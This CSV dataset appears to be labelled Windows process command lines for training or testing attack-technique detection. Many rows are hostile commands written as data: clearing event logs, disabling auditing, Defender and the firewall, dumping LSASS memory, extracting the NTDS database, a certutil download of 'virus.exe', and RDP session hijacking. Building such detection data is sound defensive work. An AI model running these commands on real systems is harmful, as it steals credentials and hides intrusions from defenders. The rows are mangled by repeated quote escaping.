"text","labels"
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg59"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe /c powershell -command """"""""""""""""Get-Service """"""""""""""""seg7"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())""""","""7;42"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe /c powershell -command """"""""""""""""Get-Service """"""""""""""""seg77"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe /c powershell -command """"""""""""""""Get-Service """"""""""""""""seg8"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe /c powershell -command """"""""""""""""Get-Service """"""""""""""""seg82"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe /c powershell -command """"""""""""""""Get-Service """"""""""""""""seg9"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe /c powershell -command """"""""""""""""Get-Service """"""""""""""""seg98"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff'.strip())""""","""42"""
"(C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe wmic  nteventlog where filename=""""""""""""""""security"""""""""""""""" cl'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl """"""""""""""""Windows PowerShell""""""""""""""""'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl RTWorkQueueTheading'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl Security'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl Setup'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl SmbWmiAnalytic'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl System'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl SystemEventsBroker'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl TabletPC_InputPanel_Channel'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl TabletPC_InputPanel_Channel/IHM'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl UIManager_Channel'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl WINDOWS_KS_CHANNEL'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl WINDOWS_WMPHOTO_CHANNEL'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl Windows.Globalization/Analytic'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\wevtutil.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\wevtutil.exe""""""""""""""""  cl WitnessClientAdmin'.strip())","""43"""
"(C:\\\\Windows\\\\System32\\\\dllhost.exe C:\\\\Windows\\\\system32\\\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'.strip())","""14"""
"(C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe C:\\\\Windows\\\\system32\\\\wbem\\\\wmiprvse.exe -secured -Embedding'.strip())","""14;23"""
"(C:\\\\Windows\\\\System32\\\\certutil.exe certutil  -urlcache -split -f https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/blob/master/EVTX_full_APT_attack_steps/ID4688,4698,4699,5145,4624-ATexec%20remote%20trask%20creation%20(GLOBAL).evtx virus.exe'.strip())","""45"""
"(C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.2108.7-0\\\\MsMpEng.exe) -> (C:\\\\Windows\\\\System32\\\\wevtutil.exe C:\\\\Windows\\\\system32\\\\wevtutil.exe install-manifest C:\\\\Windows\\\\TEMP\\\\2FB5D5D3-E6BD-E814-5320-EA7E57984413.man """"""""""""""""/resourceFilePath:C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Definition Updates\\\\StableEngineEtwLocation\\\\mpengine_etw.dll"""""""""""""""" """"""""""""""""/messageFilePath:C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Definition Updates\\\\StableEngineEtwLocation\\\\mpengine_etw.dll"""""""""""""""" """"""""""""""""/parameterFilePath:C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Definition Updates\\\\StableEngineEtwLocation\\\\mpengine_etw.dll""""""""""""""""'.strip())","""46"""
"(C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.2108.7-0\\\\MsMpEng.exe) -> (C:\\\\Windows\\\\System32\\\\wevtutil.exe C:\\\\Windows\\\\system32\\\\wevtutil.exe install-manifest C:\\\\Windows\\\\TEMP\\\\2FB5D5D3-E6BD-E814-5320-EA7E57984413.man """"""""""""""""/resourceFilePath:C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Definition Updates\\\\StableEngineEtwLocation\\\\mpengine_etw.dll"""""""""""""""" """"""""""""""""/messageFilePath:C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Definition Updates\\\\StableEngineEtwLocation\\\\mpengine_etw.dll"""""""""""""""" """"""""""""""""/parameterFilePath:C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Definition Updates\\\\StableEngineEtwLocation\\\\mpengine_etw.dll""""""""""""""""'.strip()) -> (C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'.strip())","""46"""
"(C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.2108.7-0\\\\MsMpEng.exe) -> (C:\\\\Windows\\\\System32\\\\wevtutil.exe C:\\\\Windows\\\\system32\\\\wevtutil.exe uninstall-manifest C:\\\\Windows\\\\TEMP\\\\2FB5D5D3-E6BD-E814-5320-EA7E57984413.man'.strip())","""46"""
"(C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.2108.7-0\\\\MsMpEng.exe) -> (C:\\\\Windows\\\\System32\\\\wevtutil.exe C:\\\\Windows\\\\system32\\\\wevtutil.exe uninstall-manifest C:\\\\Windows\\\\TEMP\\\\2FB5D5D3-E6BD-E814-5320-EA7E57984413.man'.strip()) -> (C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'.strip())","""46"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell.exe  -command """"""""""""""""Set-MpPreference -EnableControlledFolderAccess Disabled""""""""""""""""'.strip())","""7;46"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell.exe  -command """"""""""""""""Set-MpPreference -PUAProtection disable""""""""""""""""'.strip())","""7;46"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\sc.exe sc  config WinDefend start= disabled'.strip())","""46"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\sc.exe sc  config mpssvc start= disabled'.strip())","""46"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\sc.exe sc  config sense start= disabled'.strip())","""46"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Users\\\\admmig\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\21.180.0905.0007\\\\FileCoAuth.exe """"""""""""""""C:\\\\Users\\\\admmig\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\21.180.0905.0007\\\\FileCoAuth.exe"""""""""""""""" -Embedding'.strip())","""46"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe -Embedding'.strip())","""46"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\backgroundTaskHost.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\BackgroundTaskHost.exe"""""""""""""""" -ServerName:BackgroundTaskHost.WebAccountProvider'.strip())","""46"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\dllhost.exe C:\\\\Windows\\\\system32\\\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'.strip())","""46"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe C:\\\\Windows\\\\system32\\\\wbem\\\\wmiprvse.exe -secured -Embedding'.strip())","""46"""
"(C:\\\\Windows\\\\System32\\\\auditpol.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\auditpol.exe""""""""""""""""  /clear /y'.strip())","""47"""
"(C:\\\\Windows\\\\System32\\\\auditpol.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\auditpol.exe""""""""""""""""  /set /category:* /success:disable /failure:disable'.strip())","""47"""
"(C:\Windows\System32\auditpol.exe /set /category:"Logon/Logoff" /success:disable /failure:disable)","47"
"(C:\Windows\System32\auditpol.exe /set /category:"Object Access" /success:disable /failure:disable)","47"
"(C:\Windows\System32\auditpol.exe /set /category:* /success:disable /failure:disable)","47"
"(C:\Windows\System32\auditpol.exe /clear /y)","47"
"(C:\Windows\System32\auditpol.exe /remove /user:Everyone)","47"
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\netsh.exe netsh  a s p state off'.strip())","""48"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\netsh.exe netsh  advfirewall set privateprofile state off'.strip())","""48"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\netsh.exe netsh  f s o d'.strip())","""48"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\netsh.exe netsh  firewall set opmode disable'.strip())","""48"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\System32\\\\sppsvc.exe C:\\\\Windows\\\\system32\\\\sppsvc.exe'.strip())","""48"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe) -> (C:\\\\Windows\\\\System32\\\\Dism.exe """"""""""""""""C:\\\\WINDOWS\\\\system32\\\\Dism.exe"""""""""""""""" /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart'.strip())","""7;49"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe) -> (C:\\\\Windows\\\\System32\\\\Dism.exe """"""""""""""""C:\\\\WINDOWS\\\\system32\\\\Dism.exe"""""""""""""""" /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart'.strip()) -> (C:\\\\Users\\\\admmig\\\\AppData\\\\Local\\\\Temp\\\\EF2EDF0A-3F72-4E1D-A537-087B0AA53178\\\\DismHost.exe C:\\\\Users\\\\admmig\\\\AppData\\\\Local\\\\Temp\\\\EF2EDF0A-3F72-4E1D-A537-087B0AA53178\\\\dismhost.exe {F4C84A6D-0631-443F-B849-03CA53B4AE35}'.strip())","""49"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe) -> (C:\\\\Windows\\\\System32\\\\Dism.exe """"""""""""""""C:\\\\WINDOWS\\\\system32\\\\Dism.exe"""""""""""""""" /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart'.strip())","""7;49"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe) -> (C:\\\\Windows\\\\System32\\\\Dism.exe """"""""""""""""C:\\\\WINDOWS\\\\system32\\\\Dism.exe"""""""""""""""" /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart'.strip()) -> (C:\\\\Users\\\\admmig\\\\AppData\\\\Local\\\\Temp\\\\2FAAA3DB-0463-415C-A03A-35CDC98DA25F\\\\DismHost.exe C:\\\\Users\\\\admmig\\\\AppData\\\\Local\\\\Temp\\\\2FAAA3DB-0463-415C-A03A-35CDC98DA25F\\\\dismhost.exe {2FF3BABF-D4B4-410C-B05A-9786E419DF67}'.strip())","""7;49"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe) -> (C:\\\\Windows\\\\System32\\\\wsl.exe """"""""""""""""C:\\\\WINDOWS\\\\system32\\\\wsl.exe"""""""""""""""" --set-default-version 2'.strip())","""7;49"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\servicing\\\\TrustedInstaller.exe C:\\\\WINDOWS\\\\servicing\\\\TrustedInstaller.exe'.strip())","""49"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\dllhost.exe C:\\\\WINDOWS\\\\system32\\\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'.strip())","""49"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\taskhostw.exe taskhostw.exe'.strip())","""49"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\WinSxS\\\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.740_none_e752aa59261f271f\\\\TiWorker.exe C:\\\\WINDOWS\\\\winsxs\\\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.740_none_e752aa59261f271f\\\\TiWorker.exe -Embedding'.strip())","""49"""
"(C:\\\\Windows\\\\System32\\\\LaunchTM.exe launchtm.exe /2 '.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\SearchIndexer.exe) -> (C:\\\\Windows\\\\System32\\\\SearchFilterHost.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\SearchFilterHost.exe"""""""""""""""" 0 648 652 660 8192 656 '.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\SearchIndexer.exe) -> (C:\\\\Windows\\\\System32\\\\SearchProtocolHost.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\SearchProtocolHost.exe"""""""""""""""" Global\\\\UsGthrFltPipeMssGthrPipe57_ Global\\\\UsGthrCtrlFltPipeMssGthrPipe57 1 -2147483646 """"""""""""""""Software\\\\Microsoft\\\\Windows Search"""""""""""""""" """"""""""""""""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"""""""""""""""" """"""""""""""""C:\\\\ProgramData\\\\Microsoft\\\\Search\\\\Data\\\\Temp\\\\usgthrsvc"""""""""""""""" """"""""""""""""DownLevelDaemon"""""""""""""""" '.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\SearchIndexer.exe) -> (C:\\\\Windows\\\\System32\\\\SearchProtocolHost.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\SearchProtocolHost.exe"""""""""""""""" Global\\\\UsGthrFltPipeMssGthrPipe63_ Global\\\\UsGthrCtrlFltPipeMssGthrPipe63 1 -2147483646 """"""""""""""""Software\\\\Microsoft\\\\Windows Search"""""""""""""""" """"""""""""""""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"""""""""""""""" """"""""""""""""C:\\\\ProgramData\\\\Microsoft\\\\Search\\\\Data\\\\Temp\\\\usgthrsvc"""""""""""""""" """"""""""""""""DownLevelDaemon"""""""""""""""" '.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\Taskmgr.exe """"""""""""""""C:\\\\Windows\\\\System32\\\\Taskmgr.exe"""""""""""""""" /2 '.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\Taskmgr.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\taskmgr.exe"""""""""""""""" /4'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell.exe -NoP -C """"""""""""""""C:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\\\Windows\\\\Temp\\\\2V7Be7Gq.dmp full;Wait-Process -Id (Get-Process rundll32).id""""""""""""""""'.strip())","""7;50"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\Windows\\\\SYSTEM32\\\\cmd.exe /c """"""""""""""""C:\\\\tools\\\\shell.cmd""""""""""""""""'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\diskshadow.exe diskshadow.exe  /s shadow.txt'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\ntdsutil.exe ntdsutil  """"""""""""""""activate instance ntds"""""""""""""""" ifm """"""""""""""""create full c:\\\\hacker"""""""""""""""" quit quit'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\ntdsutil.exe ntdsutil  '.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\ntdsutil.exe ntdsutil.exe  'ac i ntds' 'ifm' 'create full c:\\\\hacker' q q'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\consent.exe consent.exe 744 308 000000E3A2F6EE10'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\consent.exe consent.exe 744 310 000000E3A2F6F950'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\rundll32.exe """"""""""""""""C:\\\\Windows\\\\System32\\\\rundll32.exe""""""""""""""""  C:\\\\Windows\\\\System32\\\\comsvcs.dll MiniDump 512 \\\\Windows\\\\Temp\\\\2V7Be7Gq.dmp full'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\System32\\\\VSSVC.exe C:\\\\Windows\\\\system32\\\\vssvc.exe'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\taskhostw.exe taskhostw.exe SYSTEM'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\wbem\\\\WMIADAP.exe wmiadap.exe /F /T'.strip())","""50"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\PktMon.exe pktmon  comp list'.strip())","""51"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\PktMon.exe pktmon  filter add -p 80'.strip())","""51"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\PktMon.exe pktmon  stop'.strip())","""51"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\PktMon.exe pktmon  stpop'.strip())","""51"""
"(C:\\\\Windows\\\\System32\\\\auditpol.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\auditpol.exe""""""""""""""""  /get /category:*'.strip())","""27"""
"(C:\\\\Windows\\\\System32\\\\netsh.exe netsh  a show allprofiles'.strip())","""27"""
"(C:\\\\Windows\\\\System32\\\\netsh.exe netsh  advfirewall show allprofiles'.strip())","""27"""
"(C:\\\\Windows\\\\System32\\\\schtasks.exe schtasks  /query /xml'.strip())","""27"""
"(C:\\\\Windows\\\\System32\\\\net.exe net  group /domain'.strip())","""4"""
"(C:\\\\Windows\\\\System32\\\\net1.exe C:\\\\Windows\\\\system32\\\\net1  group /domain'.strip())","""4"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\setspn.exe SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\\\\honey-pot1'.strip())","""32"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\setspn.exe setspn  -T offsec -Q */*'.strip())","""9"""
"(C:\\\\Windows\\\\System32\\\\net.exe net  user administrator /domain'.strip())","""9"""
"(C:\\\\Windows\\\\System32\\\\net.exe net  user administrator'.strip())","""9"""
"(C:\\\\Windows\\\\System32\\\\net1.exe C:\\\\Windows\\\\system32\\\\net1  user administrator /domain'.strip())","""9"""
"(C:\\\\Windows\\\\System32\\\\net1.exe C:\\\\Windows\\\\system32\\\\net1  user administrator'.strip())","""9"""
"(C:\\\\Windows\\\\System32\\\\net.exe net  use'.strip())","""21"""
"(C:\\\\Windows\\\\System32\\\\net.exe net  view'.strip())","""16;38"""
"(C:\\\\Windows\\\\System32\\\\net.exe net  accounts /domain'.strip())","""24"""
"(C:\\\\Windows\\\\System32\\\\net1.exe C:\\\\Windows\\\\system32\\\\net1  accounts /domain'.strip())","""24"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\cmd.exe cmd  /k tscon 2 /dest:rdp-tcp#8'.strip())","""44"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\cmd.exe cmd  /k tscon 2 /dest:rdp-tcp#8'.strip()) -> (C:\\\\Windows\\\\System32\\\\tscon.exe tscon  2 /dest:rdp-tcp#8'.strip())","""44"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\sc.exe sc.exe  start hijackservice'.strip())","""1"""
"(C:\\\\Windows\\\\System32\\\\rdpclip.exe) -> (C:\\\\Windows\\\\System32\\\\rdpinput.exe """"""""""""""""C:\\\\Windows\\\\System32\\\\rdpinput.EXE"""""""""""""""" /pid:3820 /handle:1456'.strip())","""52"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\System32\\\\cmd.exe cmd.exe /k tscon 2 /dest:rdp-tcp#5'.strip())","""44"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\System32\\\\cmd.exe cmd.exe /k tscon 2 /dest:rdp-tcp#5'.strip()) -> (C:\\\\Windows\\\\System32\\\\tscon.exe tscon  2 /dest:rdp-tcp#5'.strip())","""44"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Windows\\\\System32\\\\cmd.exe cmd.exe /k tscon 2 /dest:rdp-tcp#5'.strip()) -> (C:\\\\Windows\\\\System32\\\\tscon.exe tscon  2 /dest:rdp-tcp#5'.strip()) -> (C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'.strip())","""44"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\TSTheme.exe C:\\\\Windows\\\\system32\\\\TSTheme.exe -Embedding'.strip())","""14"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\backgroundTaskHost.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\backgroundTaskHost.exe"""""""""""""""" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca'.strip())","""14"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\consent.exe consent.exe 1072 362 000001A5ECFB0F80'.strip())","""19;39"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\consent.exe consent.exe 1072 426 000001A5F05BA860'.strip())","""19;39"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\dllhost.exe C:\\\\Windows\\\\system32\\\\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}'.strip())","""10"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\dllhost.exe C:\\\\Windows\\\\system32\\\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'.strip())","""10"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\dllhost.exe C:\\\\Windows\\\\system32\\\\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}'.strip())","""10"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\dllhost.exe C:\\\\Windows\\\\system32\\\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'.strip())","""10"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\rdpclip.exe rdpclip'.strip())","""52"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\taskhostw.exe taskhostw.exe U'.strip())","""14"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\taskhostw.exe taskhostw.exe'.strip())","""14"""
